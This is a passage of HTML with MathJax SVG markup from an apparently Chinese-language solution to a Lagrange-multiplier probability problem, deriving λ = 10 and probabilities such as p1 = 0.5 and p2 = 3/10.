xmlns=\"http://www.w3.org/2000/svg\" width=\"2.126ex\" height=\"1.439ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -442 939.6 636\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g></g></g></svg></mjx-container></span>：</p>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -1.991ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"22.331ex\" height=\"5.027ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1342 9870.2 2222\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mn\" transform=\"translate(439.8,676)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(220,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g><rect width=\"1139.6\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(1601.8,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2602,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3462.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(4518.6,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5296.3,0)\"><path data-c=\"21D2\" d=\"M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z\"/></g><g data-mml-node=\"msub\" transform=\"translate(6574.1,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(7791.4,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(8847.2,0)\"><g data-mml-node=\"mn\" transform=\"translate(261.5,676)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(220,-686)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><rect width=\"783\" height=\"60\" x=\"120\" y=\"220\"/></g></g></g></svg></mjx-container></span></p>\n<p>解得： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -1.579ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"33.016ex\" height=\"4.615ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1342 14593.1 2040\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mn\" transform=\"translate(261.5,676)\"><path data-c=\"35\" d=\"M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(220,-686)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><rect width=\"783\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(1245.2,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(2245.4,0)\"><g data-mml-node=\"mn\" transform=\"translate(261.5,676)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(220,-686)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><rect width=\"783\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(3490.7,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(4490.9,0)\"><g data-mml-node=\"mn\" transform=\"translate(261.5,676)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(220,-686)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><rect width=\"783\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(5791.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(6847.4,0)\"><g data-mml-node=\"mn\" transform=\"translate(220,676)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\" transform=\"translate(500,0)\"/></g><g data-mml-node=\"mi\" transform=\"translate(428.5,-686)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><rect width=\"1200\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(8565.2,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(9621,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(10398.8,0)\"><path data-c=\"21D2\" d=\"M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(11676.6,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(12537.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(13593.1,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\" transform=\"translate(500,0)\"/></g></g></g></svg></mjx-container></span></p>\n<p><span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -1.602ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"49.465ex\" height=\"4.638ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1342 21863.3 2050\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"msub\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(1217.3,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(2273.1,0)\"><g data-mml-node=\"mn\" transform=\"translate(470,676)\"><path data-c=\"35\" d=\"M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(220,-686)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\" transform=\"translate(500,0)\"/></g><rect width=\"1200\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(3990.9,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(5046.7,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/><path data-c=\"2E\" d=\"M78 60Q78 84 95 102T138 120Q162 120 180 104T199 61Q199 36 182 18T139 0T96 17T78 60Z\" transform=\"translate(500,0)\"/><path data-c=\"35\" d=\"M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z\" transform=\"translate(778,0)\"/></g><g data-mml-node=\"mo\" transform=\"translate(6324.7,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mstyle\" transform=\"translate(6602.7,0)\"><g data-mml-node=\"mspace\"/></g><g data-mml-node=\"msub\" transform=\"translate(7769.3,0)\"><g data-mml-node=\"mi\"><path data-c=\"1D45D\" d=\"M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(536,-150) scale(0.707)\"><path data-c=\"32\" d=\"M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(8986.7,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mfrac\" transform=\"translate(10042.4,0)\"><g data-mml-node=\"mn\" transform=\"translate(470,676)\"><path data-c=\"33\" d=\"M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(220,-686)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 